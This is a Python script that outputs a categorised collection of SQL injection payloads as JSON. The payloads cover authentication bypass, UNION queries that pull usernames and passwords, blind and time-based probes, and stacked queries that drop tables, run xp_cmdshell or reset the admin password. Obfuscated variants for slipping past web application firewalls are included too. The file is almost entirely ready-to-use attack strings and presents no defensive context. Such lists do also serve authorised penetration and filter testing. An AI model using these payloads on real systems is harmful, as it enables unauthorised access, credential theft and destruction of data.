import sys
import json

def generate_sqli_payloads(injection_type='all'):
    """
    Generate SQL injection payloads
    """
    
    payloads = {
        'auth_bypass': {
            'description': 'Authentication Bypass Payloads',
            'payloads': [
                "' OR '1'='1",
                "' OR '1'='1' --",
                "' OR '1'='1' #",
                "' OR '1'='1'/*",
                "admin' --",
                "admin' #",
                "admin'/*",
                "' or 1=1--",
                "' or 1=1#",
                "' or 1=1/*",
                "') or '1'='1--",
                "') or ('1'='1--",
                "1' or '1' = '1",
                "' OR 'x'='x",
                "admin' OR '1'='1",
                "' UNION SELECT NULL--",
                "' UNION SELECT NULL,NULL--",
                "' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055",
            ]
        },
        'union_based': {
            'description': 'UNION-based SQL Injection',
            'payloads': [
                "' UNION SELECT NULL--",
                "' UNION SELECT NULL,NULL--",
                "' UNION SELECT NULL,NULL,NULL--",
                "' UNION SELECT NULL,NULL,NULL,NULL--",
                "' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
                "' UNION ALL SELECT NULL--",
                "' UNION ALL SELECT NULL,NULL--",
                "' UNION SELECT 1,2,3--",
                "' UNION SELECT table_name,NULL FROM information_schema.tables--",
                "' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--",
                "' UNION SELECT username,password FROM users--",
                "' UNION SELECT user(),database()--",
                "' UNION SELECT version(),user()--",
                "' UNION SELECT @@version,NULL--",
            ]
        },
        'error_based': {
            'description': 'Error-based SQL Injection',
            'payloads': [
                "'",
                "''",
                "\"",
                "\"\"",
                "' AND 1=2--",
                "' AND 1=CONVERT(int, (SELECT @@version))--",
                "' AND 1=CAST((SELECT @@version) AS int)--",
                "' AND extractvalue(1,concat(0x7e,version()))--",
                "' AND updatexml(1,concat(0x7e,version()),1)--",
                "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            ]
        },
        'boolean_based': {
            'description': 'Boolean-based Blind SQL Injection',
            'payloads': [
                "' AND '1'='1",
                "' AND '1'='2",
                "' AND 1=1--",
                "' AND 1=2--",
                "' AND SUBSTRING(version(),1,1)='5",
                "' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>100--",
                "' AND (SELECT COUNT(*) FROM users)>0--",
                "' AND (SELECT LENGTH(database()))>5--",
            ]
        },
        'time_based': {
            'description': 'Time-based Blind SQL Injection',
            'payloads': [
                "' AND SLEEP(5)--",
                "' AND BENCHMARK(5000000,MD5('test'))--",
                "' WAITFOR DELAY '00:00:05'--",
                "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
                "'; WAITFOR DELAY '00:00:05'--",
                "1' AND SLEEP(5) AND '1'='1",
                "' AND IF(1=1,SLEEP(5),0)--",
                "' AND IF(SUBSTRING(version(),1,1)='5',SLEEP(5),0)--",
            ]
        },
        'stacked_queries': {
            'description': 'Stacked Queries (Multiple Statements)',
            'payloads': [
                "'; DROP TABLE users--",
                "'; INSERT INTO users VALUES('hacker','password')--",
                "'; UPDATE users SET password='hacked' WHERE username='admin'--",
                "'; EXEC xp_cmdshell('whoami')--",
                "'; SELECT * FROM users--",
                "1'; WAITFOR DELAY '00:00:05'--",
            ]
        },
        'second_order': {
            'description': 'Second Order SQL Injection',
            'payloads': [
                "admin'--",
                "admin' OR '1'='1'--",
                "admin'); DROP TABLE users--",
            ]
        },
        'filter_bypass': {
            'description': 'WAF/Filter Bypass Techniques',
            'payloads': [
                "' OR 1=1#",
                "' /*!OR*/ 1=1--",
                "' %4f%52 1=1--",  
                "' UnIoN SeLeCt NULL--",  
                "' /**/OR/**/1=1--",  
                "' OR/**/1/**/=/**/1--",
                "' /*!50000OR*/ 1=1--", 
                "' /*!12345UNION*/ /*!12345SELECT*/ NULL--",
                "' AND 1=1 AND 'a'='a",
                "' %55nion %53elect NULL--",  
                "' UnIOn SeLEct 1,2,3--",
                "' OR 1=1/*",
                "admin'+OR+'1'='1",
                "' OR 'x'='x",
            ]
        }
    }
    
    if injection_type == 'all':
        result = {
            'total_categories': len(payloads),
            'total_payloads': sum(len(cat['payloads']) for cat in payloads.values()),
            'categories': payloads
        }
    elif injection_type in payloads:
        result = {
            'category': injection_type,
            'description': payloads[injection_type]['description'],
            'payloads': payloads[injection_type]['payloads'],
            'count': len(payloads[injection_type]['payloads'])
        }
    else:
        error = {"error": f"Invalid injection type: {injection_type}"}
        print(json.dumps(error))
        return 1
    
    print(json.dumps(result, indent=2))
    return 0

if __name__ == "__main__":
    injection_type = sys.argv[1] if len(sys.argv) > 1 else 'all'
    sys.exit(generate_sqli_payloads(injection_type))